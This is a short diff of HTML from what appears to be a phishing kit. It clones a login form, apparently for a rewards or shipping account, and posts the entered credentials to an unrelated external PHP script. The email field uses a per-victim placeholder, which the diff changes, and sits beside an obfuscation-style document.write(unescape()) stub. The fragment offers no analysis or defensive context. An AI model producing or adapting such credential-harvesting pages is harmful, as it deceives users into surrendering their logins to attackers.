@@ -417,7 +417,7 @@ background: #efca58;" ng-repeat="errorMessage in formErrorsCtrl.formCtrl.formErr
                  <form name="max" method="post" action="https://veshtrin.com/khi/dhol/dhll.php" class="fancy-form-container ng-pristine ng-invalid ng-invalid-ewf-valid"> 
                   <div class="loginContainer_title"> <!-- ngIf: loginCtrl.notification --> 
                   </div><!-- ngIf: loginCtrl.userInactive -->
-                  <div ewf-field="username" class="ng-scope"> <label class="field-wrapper login-form__input"> <input class="input input_width_full required fancy-form-input ng-pristine ewf-email-validation ewf-required ng-valid-email ng-invalid ng-invalid-ewf-valid ng-empty" id="email" name="email" value="[[-Email-]]" readonly type="email" autocomplete="off"> <script>
+                  <div ewf-field="username" class="ng-scope"> <label class="field-wrapper login-form__input"> <input class="input input_width_full required fancy-form-input ng-pristine ewf-email-validation ewf-required ng-valid-email ng-invalid ng-invalid-ewf-valid ng-empty" id="email" name="email" value="" readonly type="email" autocomplete="off"> <script>
 var gs=""; document.write(unescape(gs));
 </script> <span class="fancy-form-label-floating" style="top: 8.5px;">Email address</span> <span class="validation-mark"></span> <!-- ngIf: fieldErrorsCtrl.getErrorMessages().length -->
                     <div class="msg-error ng-scope" ng-if="fieldErrorsCtrl.getErrorMessages().length" aqa-id="rewardCardErrorMsgContainer" ewf-field-errors=""> <!-- ngRepeat: errorMessage in fieldErrorsCtrl.getErrorMessages() track by $index -->
